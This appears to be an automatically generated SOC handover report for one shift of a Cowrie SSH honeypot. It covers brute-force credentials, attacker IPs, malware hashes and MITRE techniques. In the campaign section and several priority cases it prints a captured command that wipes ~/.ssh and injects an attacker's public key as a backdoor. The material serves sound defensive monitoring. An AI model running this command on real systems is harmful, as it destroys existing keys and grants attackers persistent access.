# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-04 |
| **Generated At** | 2026-04-04T16:33:41Z |
| **Shift Time** | 16:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **48** |
| Confirmed Threats | **43** |
| False Positives Filtered | **5** (10.4%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **16** |
| High Severity Cases | **6** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **42** |
| Malware Samples Analyzed | **0** HIGH · **14** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **29** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **18** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 6 |
| `345gs5662d34` | 3 |
| `Operator` | 2 |
| `ubuntu` | 2 |
| `guest` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `7777` | 2 |
| `dietpi` | 1 |
| `123456789` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `Operator` | `dietpi` | 1 |
| `administrator` | `123456789` | 1 |
| `userssh` | `safe4you` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `a123456789b` | `80.87.83.229` | 2026-04-04T14:54:55 |
| `root` | `3245gs5662d34` | `80.87.83.229` | 2026-04-04T14:55:04 |
| `root` | `Zy123456!` | `203.145.34.165` | 2026-04-04T15:00:17 |
| `root` | `3245gs5662d34` | `203.145.34.165` | 2026-04-04T15:00:23 |
| `root` | `123456jJ` | `177.10.201.7` | 2026-04-04T15:57:48 |
| `root` | `3245gs5662d34` | `177.10.201.7` | 2026-04-04T15:57:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **48** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 17 |
| OpenSSH | 15 |
| Unknown | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 17 | 6 |
| `acaa53e0a7d7...` | Mirai/variant | 15 | 15 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 17 | 6 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 15 | 15 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `203.145.34.165`, `177.10.201.7`, `80.87.83.229`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **30** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4713` | NTT DOCOMO BUSINESS,Inc. | 1 | MEDIUM |
| `AS24547` | Hebei Mobile Communication Company Limited | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (6)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2159baed75ca

| Field | Detail |
|---|---|
| **Source IP** | `80.87.83[.]229` |
| **First Seen** | 2026-04-04 14:54 |
| **Last Seen** | 2026-04-04 14:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 14:54:53` | `cowrie.session.connect` |
| `2026-04-04 14:54:53` | `cowrie.client.version` |
| `2026-04-04 14:54:54` | `cowrie.client.kex` |
| `2026-04-04 14:54:55` | `cowrie.login.success` |
| `2026-04-04 14:54:56` | `cowrie.session.params` |
| `2026-04-04 14:54:56` | `cowrie.command.input` |
| `2026-04-04 14:54:56` | `cowrie.command.failed` |
| `2026-04-04 14:54:56` | `cowrie.log.closed` |
| `2026-04-04 14:54:57` | `cowrie.session.params` |
| `2026-04-04 14:54:57` | `cowrie.command.input` |
| `2026-04-04 14:54:58` | `cowrie.session.file_download` |
| `2026-04-04 14:54:58` | `cowrie.log.closed` |
| `2026-04-04 14:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.87.83[.]229` to AbuseIPDB if not already reported
- [ ] Block `80.87.83[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28c5d34c31cb

| Field | Detail |
|---|---|
| **Source IP** | `80.87.83[.]229` |
| **First Seen** | 2026-04-04 14:55 |
| **Last Seen** | 2026-04-04 14:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 14:55:02` | `cowrie.session.connect` |
| `2026-04-04 14:55:02` | `cowrie.client.version` |
| `2026-04-04 14:55:02` | `cowrie.client.kex` |
| `2026-04-04 14:55:04` | `cowrie.login.success` |
| `2026-04-04 14:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.87.83[.]229` to AbuseIPDB if not already reported
- [ ] Block `80.87.83[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91614e4b13ca

| Field | Detail |
|---|---|
| **Source IP** | `203.145.34[.]165` |
| **First Seen** | 2026-04-04 15:00 |
| **Last Seen** | 2026-04-04 15:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 15:00:16` | `cowrie.session.connect` |
| `2026-04-04 15:00:16` | `cowrie.client.version` |
| `2026-04-04 15:00:16` | `cowrie.client.kex` |
| `2026-04-04 15:00:17` | `cowrie.login.success` |
| `2026-04-04 15:00:18` | `cowrie.session.params` |
| `2026-04-04 15:00:18` | `cowrie.command.input` |
| `2026-04-04 15:00:18` | `cowrie.command.failed` |
| `2026-04-04 15:00:18` | `cowrie.log.closed` |
| `2026-04-04 15:00:18` | `cowrie.session.params` |
| `2026-04-04 15:00:18` | `cowrie.command.input` |
| `2026-04-04 15:00:19` | `cowrie.session.file_download` |
| `2026-04-04 15:00:19` | `cowrie.log.closed` |
| `2026-04-04 15:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.34[.]165` to AbuseIPDB if not already reported
- [ ] Block `203.145.34[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-233435c30256

| Field | Detail |
|---|---|
| **Source IP** | `203.145.34[.]165` |
| **First Seen** | 2026-04-04 15:00 |
| **Last Seen** | 2026-04-04 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 15:00:21` | `cowrie.session.connect` |
| `2026-04-04 15:00:21` | `cowrie.client.version` |
| `2026-04-04 15:00:22` | `cowrie.client.kex` |
| `2026-04-04 15:00:23` | `cowrie.login.success` |
| `2026-04-04 15:00:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.145.34[.]165` to AbuseIPDB if not already reported
- [ ] Block `203.145.34[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-249707fc0a54

| Field | Detail |
|---|---|
| **Source IP** | `177.10.201[.]7` |
| **First Seen** | 2026-04-04 15:57 |
| **Last Seen** | 2026-04-04 15:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 15:57:46` | `cowrie.session.connect` |
| `2026-04-04 15:57:46` | `cowrie.client.version` |
| `2026-04-04 15:57:46` | `cowrie.client.kex` |
| `2026-04-04 15:57:48` | `cowrie.login.success` |
| `2026-04-04 15:57:48` | `cowrie.session.params` |
| `2026-04-04 15:57:48` | `cowrie.command.input` |
| `2026-04-04 15:57:48` | `cowrie.command.failed` |
| `2026-04-04 15:57:49` | `cowrie.log.closed` |
| `2026-04-04 15:57:49` | `cowrie.session.params` |
| `2026-04-04 15:57:49` | `cowrie.command.input` |
| `2026-04-04 15:57:50` | `cowrie.session.file_download` |
| `2026-04-04 15:57:50` | `cowrie.log.closed` |
| `2026-04-04 15:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.10.201[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.10.201[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a2e674331ac

| Field | Detail |
|---|---|
| **Source IP** | `177.10.201[.]7` |
| **First Seen** | 2026-04-04 15:57 |
| **Last Seen** | 2026-04-04 15:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 15:57:53` | `cowrie.session.connect` |
| `2026-04-04 15:57:53` | `cowrie.client.version` |
| `2026-04-04 15:57:53` | `cowrie.client.kex` |
| `2026-04-04 15:57:55` | `cowrie.login.success` |
| `2026-04-04 15:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.10.201[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.10.201[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `177.10.201[.]7` | **5** | 2026-04-04 14:59 | 2026-04-04 16:00 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `157.245.243[.]118` | **2** | 2026-04-04 16:06 | 2026-04-04 16:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.192[.]66` | **2** | 2026-04-04 16:11 | 2026-04-04 16:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.87.83[.]229` | **2** | 2026-04-04 14:54 | 2026-04-04 14:57 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `113.108.88[.]121` | 1 | 2026-04-04 15:04 | 2026-04-04 15:05 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.211.5[.]35` | 1 | 2026-04-04 15:06 | 2026-04-04 15:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `123.24.206[.]213` | 1 | 2026-04-04 15:42 | 2026-04-04 15:42 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `128.199.8[.]140` | 1 | 2026-04-04 15:19 | 2026-04-04 15:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `146.255.228[.]189` | 1 | 2026-04-04 15:02 | 2026-04-04 15:03 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-04-04 16:16 | 2026-04-04 16:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-04 14:47 | 2026-04-04 14:47 | 10s | 0 | `T1592` | 🟢 LOW |
| `180.102.22[.]96` | 1 | 2026-04-04 14:33 | 2026-04-04 14:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.141[.]1` | 1 | 2026-04-04 16:19 | 2026-04-04 16:21 | 111s | 0 | `T1592` | 🟢 LOW |
| `180.76.52[.]146` | 1 | 2026-04-04 15:42 | 2026-04-04 15:42 | 5s | 0 | `T1592` | 🟢 LOW |
| `203.145.34[.]165` | 1 | 2026-04-04 15:00 | 2026-04-04 15:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `210.192.95[.]22` | 1 | 2026-04-04 16:01 | 2026-04-04 16:01 | 14s | 0 | `T1592` | 🟢 LOW |
| `220.122.115[.]9` | 1 | 2026-04-04 16:22 | 2026-04-04 16:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.194[.]124` | 1 | 2026-04-04 14:59 | 2026-04-04 14:59 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.215.0[.]179` | 1 | 2026-04-04 14:43 | 2026-04-04 14:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.154[.]155` | 1 | 2026-04-04 15:24 | 2026-04-04 15:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-04 14:50 | 2026-04-04 14:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.120.8[.]61` | 1 | 2026-04-04 15:58 | 2026-04-04 15:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.149[.]239` | 1 | 2026-04-04 16:02 | 2026-04-04 16:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `68.106.239[.]86` | 1 | 2026-04-04 16:01 | 2026-04-04 16:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.154.2[.]19` | 1 | 2026-04-04 16:17 | 2026-04-04 16:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `83.254.220[.]215` | 1 | 2026-04-04 16:17 | 2026-04-04 16:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.110.92[.]62` | 1 | 2026-04-04 15:22 | 2026-04-04 15:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.188.38[.]227` | 1 | 2026-04-04 14:40 | 2026-04-04 14:40 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.180.238[.]116` | 1 | 2026-04-04 14:44 | 2026-04-04 14:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `97.113.167[.]222` | 1 | 2026-04-04 15:43 | 2026-04-04 15:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 35/100 | 🟢 LOW | **15/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.24.206[.]213` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 30 |
| `85.110.92[.]62` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 9 |
| `47.215.0[.]179` | US | Optimum | **100** ⚠️ | 15 |
| `128.199.8[.]140` | US | DigitalOcean, LLC | **100** ⚠️ | 16 |
| `180.76.52[.]146` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 30 |
| `83.254.220[.]215` | SE | Tele2 Sverige AB | **100** ⚠️ | 11 |
| `210.192.95[.]22` | KR | HVYeongnam | **100** ⚠️ | 2 |
| `157.245.243[.]118` | US | DigitalOcean, LLC | **100** ⚠️ | 20 |
| `90.188.38[.]227` | RU | OJSC Sibirtelecom | **100** ⚠️ | 28 |
| `97.113.167[.]222` | US | CenturyLink Communications, LLC | **100** ⚠️ | 8 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 35 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 23 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 6 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 48 cases |
| Tool 34  | Credential Extractor        | ✅ 29 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (10.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 30 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 6 priority case(s) shown individually · 30 recon entry/entries in table (4 group(s) consolidating 11 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-04T16:33:41Z_
